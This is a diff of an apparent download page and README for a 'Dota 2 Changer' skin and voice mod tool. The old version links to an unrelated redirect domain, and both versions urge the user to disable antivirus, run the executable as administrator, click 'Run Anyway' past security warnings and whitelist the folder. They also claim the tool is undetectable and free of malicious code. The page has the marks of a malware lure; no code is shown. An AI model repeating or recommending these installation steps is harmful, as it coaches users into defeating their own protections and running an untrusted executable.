@@ -1,17 +1,74 @@
-<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
-<h1 style="color:#cc88ff;border-bottom:2px solid #9966dd;text-align:center;">🎶 Dota 2 Changer (Gamesok) | Change Skins, Voices & Interface 🎶</h1>
-<p style="font-size:1.1em;text-align:center;"><strong>The original comprehensive client modder.</strong> Replace skins, voices, loading screens, and interface elements with ease.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#cc88ff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD DOTA 2 CHANGER (LOADER)</a><p>✅ Full visual tune-up ✅ Voice replacement ✅ Free to use ✅ Safe</p></div>
-<img src="https://i.ytimg.com/vi/7SWG25RDAfo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLA-fpQrzjjVKoaiiHnXgOtA_9Pkew" style="max-width:100%;border-radius:8px;margin:15px 0;">
-<div><h3>🎮 What You Can Change:</h3>
-<ul><li><strong>Full Customization:</strong> Tune the Dota 2 client by installing standard items, exclusive sets, new voices, loading screens, and custom HUDs.</li>
-<li><strong>Model & Audio Swapping:</strong> Replace 3D models, sound effects, hero voice lines, and interface elements.</li>
-<li><strong>Self-Visible Only:</strong> All changes are client-side, meaning you are the only one who sees the modifications, ensuring game safety.</li>
-<li><strong>Regular Updates:</strong> The tool is updated frequently to keep up with game patches.</li>
-<li><strong>Safe to Use:</strong> Designed to be undetectable, with no risk of a VAC ban.</li>
-<li><strong>Simple Installation:</strong> Download, extract to a path with no Cyrillic characters (e.g., your Desktop), and run the program.</li></ul>
-<h3>⚙️ System Requirements:</h3><p>Windows 10/11, .NET Framework 4.5.2+, Steam and Dota 2 installed, 200 MB free space.</p>
-<h3>📥 Installation:</h3>
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
-<div><strong>Tags:</strong> dota 2 changer v12.6 download, dota 2 changer gamesok, dota 2 skin changer classic, dota 2 skin changer no ban 2026, dota 2 voice mod changer, dota 2 custom ui skin, dota 2 free interface skins.</div>
-</div>
+# 🎮 Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface - Personalize your Dota 2 game experience
+
+[![Download Now](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface)
+
+This application allows you to modify your Dota 2 game client. You can replace character skins, announcer voices, loading screens, and game interface elements using a simple interface. The software works as a client-side wrapper that injects custom assets into your game files without requiring advanced technical skills.
+
+## 📥 Getting Started
+
+Follow these steps to set up the software on your Windows computer.
+
+1.  Visit the official release page: [https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface](https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface)
+2.  Locate the latest version file.
+3.  Click the file to start your download.
+4.  Save the installer file to your desktop or downloads folder.
+
+## ⚙️ System Requirements
+
+To run this application, ensure your computer meets these standards:
+
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core CPU or better.
+*   Memory: 4 GB RAM minimum.
+*   Storage: 500 MB of free space for assets and the client.
+*   Internet Connection: Required for downloading skin and voice updates.
+*   Dota 2 Installation: The game must be installed via Steam on your local drive.
+
+## 🛠️ Installation Steps
+
+The software runs as a portable application. You do not need a complex installer.
+
+1.  Open the folder where you saved the download file.
+2.  Double-click the .exe file to launch the program.
+3.  If a security window appears, click More Info and then Run Anyway.
+4.  The application will detect your Dota 2 installation folder path automatically.
+5.  If the software cannot find the game, click the Browse button and choose your main Dota 2 Steam folder.
+6.  Wait for the application to index your current game files. This process may take one or two minutes.
+
+## 🎨 Changing Your Game Assets
+
+The dashboard contains categorized tabs for each type of modification.
+
+### Replacing Skins
+Navigate to the Heroes tab. You will see a list of every character in the game. Select a hero to view available skin mods. Click on the skin you want to apply. The software will download the necessary textures and apply them to your game client. You can preview models before you make changes.
+
+### Customizing Voices
+Go to the Sounds tab. Choose between character dialogue, announcer packs, or event music. Select an option and click Apply. The software replaces the existing sound files with the custom versions. 
+
+### Interface Elements
+Open the UI tab to change how the game looks. You can swap out the HUD, cursor style, or menu backgrounds. Click the preview button to see how these changes appear before you finalize the selection.
+
+## 🔄 Updating and Maintenance
+
+Check the main window of the software regularly to see if new skins or voice packs exist. The software informs you when an update becomes available. Click the Update button inside the program to download the latest game assets. 
+
+If you encounter issues after a game update, use the Repair button. This function scans your original game files and removes any modifications to restore the game to its default state. 
+
+## 🛡️ Important Safety Information
+
+This tool modifies game files locally. These changes remain visible only to you. Other players will not see these skins or hear your custom voice packs. 
+
+Some antivirus programs may flag modification tools as suspicious because they access game installation files. This is a common occurrence. The software does not carry malicious code. If your antivirus blocks the program, create an exception for the folder where you keep the application.
+
+## 🔍 Troubleshooting Common Issues
+
+*   Software will not open: Ensure you have the latest .NET Framework installed on your Windows machine.
+*   Skins do not appear: Make sure the game is closed before you apply new mods. Restart the game client after every change.
+*   Error messages: Check that your hard drive has sufficient space. If the issue persists, run the application as an administrator by right-clicking the icon and selecting Run as Administrator.
+*   Game crashes: Use the Reset button in the settings menu to clear all modifications and verify the integrity of your game files through the Steam client.
+
+## 💬 Support and Community
+
+You can find common solutions and community updates on the project repository page. Users often share tips on selecting the best skin combinations. 
+
+Visit the page here: [https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface](https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface)
